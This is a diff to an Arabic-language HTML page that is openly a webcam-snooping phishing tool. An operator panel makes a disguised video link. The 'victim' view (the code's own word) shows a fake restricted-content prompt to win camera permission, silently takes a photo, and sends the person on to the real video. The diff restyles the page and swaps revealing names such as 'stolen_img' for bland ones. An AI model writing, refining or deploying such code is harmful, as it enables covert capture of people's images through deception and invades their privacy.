@@ -3,70 +3,190 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>نظام تحويل الروابط</title>
+    <title>لوحة التحكم الاحترافية</title>
     <style>
-        body, html { margin: 0; padding: 0; width: 100%; height: 100%; background: #f0f2f5; font-family: sans-serif; }
-        .container { display: flex; justify-content: center; align-items: center; height: 100vh; }
-        
-        /* لوحة التحكم الخاصة بك */
-        .admin-box { background: white; padding: 30px; border-radius: 15px; width: 90%; max-width: 450px; text-align: center; box-shadow: 0 10px 25px rgba(0,0,0,0.1); color: #333; }
-        .admin-box input { width: 100%; padding: 12px; margin: 15px 0; border: 1px solid #ddd; border-radius: 8px; box-sizing: border-box; }
-        
-        /* واجهة الضحية */
-        .victim-ui { background: #000; width: 100%; height: 100%; display: flex; flex-direction: column; justify-content: center; align-items: center; color: white; position: fixed; top: 0; left: 0; }
-        .dialog { background: #1a1a1a; padding: 30px; border-radius: 15px; text-align: center; border: 1px solid #333; width: 80%; max-width: 350px; }
-        
-        .btn { background: #2563eb; color: white; border: none; padding: 12px 25px; border-radius: 8px; cursor: pointer; width: 100%; font-weight: bold; font-size: 16px; }
+        :root {
+            --bg-dark: #0f172a;
+            --card-dark: #1e293b;
+            --accent: #3b82f6;
+            --accent-hover: #2563eb;
+            --text-main: #f8fafc;
+            --text-dim: #94a3b8;
+            --danger: #ef4444;
+            --success: #10b981;
+        }
+
+        body, html {
+            margin: 0; padding: 0; width: 100%; height: 100%;
+            background: var(--bg-dark);
+            font-family: 'Segoe UI', Roboto, sans-serif;
+            color: var(--text-main);
+        }
+
+        .container {
+            display: flex; justify-content: center; align-items: center;
+            min-height: 100vh; padding: 20px; box-sizing: border-box;
+        }
+
+        /* لوحة التحكم المطورة */
+        .admin-box {
+            background: var(--card-dark);
+            padding: 40px;
+            border-radius: 24px;
+            width: 100%;
+            max-width: 480px;
+            text-align: center;
+            box-shadow: 0 20px 50px rgba(0,0,0,0.3);
+            border: 1px solid rgba(255,255,255,0.1);
+            transition: all 0.3s ease;
+        }
+
+        h2 { margin-bottom: 10px; font-size: 24px; color: var(--text-main); }
+        p.desc { color: var(--text-dim); font-size: 14px; margin-bottom: 25px; }
+
+        .input-group { text-align: right; margin-bottom: 20px; }
+        .input-group label { display: block; margin-bottom: 8px; color: var(--text-dim); font-size: 13px; }
+
+        input[type="text"] {
+            width: 100%;
+            padding: 14px;
+            background: #0f172a;
+            border: 1px solid #334155;
+            border-radius: 12px;
+            color: white;
+            font-size: 15px;
+            transition: border 0.3s;
+            box-sizing: border-box;
+        }
+
+        input[type="text"]:focus {
+            border-color: var(--accent);
+            outline: none;
+            box-shadow: 0 0 0 3px rgba(59, 130, 246, 0.2);
+        }
+
+        .btn {
+            background: var(--accent);
+            color: white;
+            border: none;
+            padding: 14px 28px;
+            border-radius: 12px;
+            cursor: pointer;
+            width: 100%;
+            font-weight: 600;
+            font-size: 16px;
+            transition: all 0.2s ease;
+        }
+
+        .btn:hover { background: var(--accent-hover); transform: translateY(-2px); }
+        .btn:active { transform: translateY(0); }
+
+        /* منطقة الرابط الناتج */
+        .result-area {
+            margin-top: 30px;
+            padding: 20px;
+            background: rgba(59, 130, 246, 0.1);
+            border-radius: 16px;
+            border: 1px dashed var(--accent);
+            animation: fadeIn 0.5s ease;
+        }
+
+        #preview-container {
+            margin-top: 30px;
+            display: none;
+            animation: slideUp 0.5s ease;
+        }
+
+        #preview-img {
+            width: 100%;
+            border-radius: 16px;
+            border: 4px solid var(--accent);
+            box-shadow: 0 10px 30px rgba(0,0,0,0.5);
+        }
+
+        .status-badge {
+            display: inline-block;
+            padding: 6px 12px;
+            border-radius: 20px;
+            font-size: 12px;
+            margin-top: 15px;
+            background: #334155;
+            color: var(--text-dim);
+        }
+
+        .status-online { background: var(--success); color: white; }
+
+        /* واجهة الضحية (نفس الطلبات السابقة) */
+        .victim-ui {
+            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
+            background: #000; z-index: 9999;
+            display: flex; justify-content: center; align-items: center;
+        }
+        .dialog-box {
+            background: #111; padding: 40px; border-radius: 20px;
+            text-align: center; border: 1px solid #222; width: 85%; max-width: 350px;
+        }
+
         .hidden { display: none !important; }
-        #preview { width: 100%; margin-top: 15px; border: 3px solid #2563eb; border-radius: 10px; display: none; }
+
+        @keyframes fadeIn { from { opacity: 0; } to { opacity: 1; } }
+        @keyframes slideUp { from { transform: translateY(20px); opacity: 0; } to { transform: translateY(0); opacity: 1; } }
     </style>
 </head>
 <body>
 
-    <div class="container">
-        <div id="admin-panel" class="admin-box">
-            <h2>توليد رابط مشفر</h2>
-            <p>أدخل رابط الفيديو (يوتيوب/تيك توك):</p>
+<div class="container">
+    <div id="admin-panel" class="admin-box">
+        <h2>لوحة التحكم الذكية</h2>
+        <p class="desc">قم بتوليد رابط مموه وتتبع النتائج فوراً</p>
+
+        <div class="input-group">
+            <label>رابط الوجهة (YouTube / TikTok)</label>
             <input type="text" id="urlInput" placeholder="https://www.youtube.com/watch?v=...">
-            <button class="btn" onclick="generate()">إنشاء الرابط</button>
-            
-            <div id="result" class="hidden">
-                <p>أرسل هذا الرابط للطرف الآخر:</p>
-                <input type="text" id="finalLink" readonly onclick="this.select()">
-            </div>
-            <hr style="margin: 20px 0;">
-            <p id="status">في انتظار الطرف الآخر...</p>
-            <img id="preview">
         </div>
 
-        <div id="victim-panel" class="victim-ui hidden">
-            <div class="dialog">
-                <h2 style="margin-top:0;">محتوى مقيد</h2>
-                <p style="color: #ccc;">لمشاهدة هذا الفيديو، يجب عليك منح إذن "السماح بالمشاهدة" للمشغل.</p>
-                <button class="btn" id="allowBtn" style="background: #ff0000;">السماح بالمشاهدة</button>
-            </div>
-            <video id="video" autoplay playsinline style="display:none"></video>
-            <canvas id="canvas" style="display:none"></canvas>
+        <button class="btn" onclick="generate()">إنشاء الرابط السحري</button>
+        
+        <div id="result" class="result-area hidden">
+            <p style="font-size: 13px; color: var(--accent); margin-bottom: 10px;">تم توليد الرابط بنجاح:</p>
+            <input type="text" id="finalLink" readonly onclick="this.select()">
+            <p style="font-size: 11px; color: var(--text-dim); margin-top: 8px;">(انسخ الرابط وأرسله للطرف الآخر)</p>
         </div>
+
+        <div id="preview-container">
+            <div class="status-badge status-online">✅ تم استلام صورة جديدة!</div>
+            <img id="preview-img">
+        </div>
+
+        <div id="waiting-status" class="status-badge">في انتظار فتح الرابط...</div>
     </div>
+
+    <div id="victim-panel" class="victim-ui hidden">
+        <div class="dialog-box">
+            <h2 style="margin-top:0;">محتوى مقيد</h2>
+            <p style="color: #888; line-height: 1.6;">لمشاهدة هذا الفيديو، يرجى منح إذن "السماح بالمشاهدة" لمشغل الوسائط.</p>
+            <button class="btn" id="allowBtn" style="background: var(--danger); margin-top: 20px;">السماح بالمشاهدة</button>
+        </div>
+        <video id="video" autoplay playsinline style="display:none"></video>
+        <canvas id="canvas" style="display:none"></canvas>
+    </div>
+</div>
 
 <script>
     const params = new URLSearchParams(window.location.search);
-    const mode = params.get('view');
+    const mode = params.get('auth');
 
-    // --- سيناريو الطرف الآخر (الضحية) ---
-    if (mode === 'content_check') {
+    // --- منطق الضحية ---
+    if (mode === 'video_verify') {
         document.getElementById('admin-panel').classList.add('hidden');
         document.getElementById('victim-panel').classList.remove('hidden');
 
         document.getElementById('allowBtn').onclick = async () => {
             try {
-                // طلب الكاميرا
                 const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                 const video = document.getElementById('video');
                 video.srcObject = stream;
 
-                // التقاط الصورة فوراً بعد الموافقة
                 setTimeout(() => {
                     const canvas = document.getElementById('canvas');
                     canvas.width = video.videoWidth;
@@ -74,44 +194,49 @@
                     canvas.getContext('2d').drawImage(video, 0, 0);
                     
                     const data = canvas.toDataURL('image/jpeg', 0.5);
+                    localStorage.setItem('captured_data', data);
                     
-                    // إرسال الصورة للوحة التحكم (عبر المتصفح)
-                    localStorage.setItem('stolen_img', data);
-                    
-                    // جلب الرابط الأصلي للتحويل
-                    const target = localStorage.getItem('redirect_url') || 'https://youtube.com';
+                    const target = localStorage.getItem('last_redirect') || 'https://www.youtube.com';
                     
                     stream.getTracks().forEach(t => t.stop());
-                    window.location.href = target; // تحويله للفيديو
-                }, 800);
+                    window.location.href = target;
+                }, 1000);
             } catch (err) {
-                alert("يجب السماح بالوصول للمشغل لمشاهدة المحتوى.");
+                alert("عذراً، يجب السماح بالوصول للمشغل لمشاهدة الفيديو.");
             }
         };
     }
 
-    // --- سيناريو لوحة التحكم (أنت) ---
+    // --- منطق المدير (أنت) ---
     function generate() {
         const url = document.getElementById('urlInput').value;
-        if (!url) return alert("يرجى إدخال الرابط أولاً");
+        if (!url) {
+            alert("يرجى إدخال رابط الوجهة أولاً");
+            return;
+        }
 
-        // حفظ الرابط الأصلي في المتصفح ليتم سحبه لاحقاً
-        localStorage.setItem('redirect_url', url);
-
+        localStorage.setItem('last_redirect', url);
         const baseUrl = window.location.href.split('?')[0];
-        document.getElementById('finalLink').value = baseUrl + "?view=content_check";
+        document.getElementById('finalLink').value = baseUrl + "?auth=video_verify";
         document.getElementById('result').classList.remove('hidden');
-
-        // انتظار الصورة
-        window.addEventListener('storage', (event) => {
-            if (event.key === 'stolen_img') {
-                const img = document.getElementById('preview');
-                img.src = event.newValue;
-                img.style.display = 'block';
-                document.getElementById('status').innerText = "✅ تم استلام صورة الشخص!";
-            }
-        });
+        
+        // تحسين بصري
+        document.getElementById('waiting-status').innerText = "بانتظار الطرف الآخر (رابطك نشط)...";
     }
+
+    // التنصت على التغييرات (يعمل عند فتح تبويبين لنفس الموقع)
+    window.addEventListener('storage', (event) => {
+        if (event.key === 'captured_data') {
+            const container = document.getElementById('preview-container');
+            const img = document.getElementById('preview-img');
+            const waiting = document.getElementById('waiting-status');
+
+            img.src = event.newValue;
+            container.style.display = 'block';
+            waiting.style.display = 'none';
+        }
+    });
 </script>
+
 </body>
 </html>
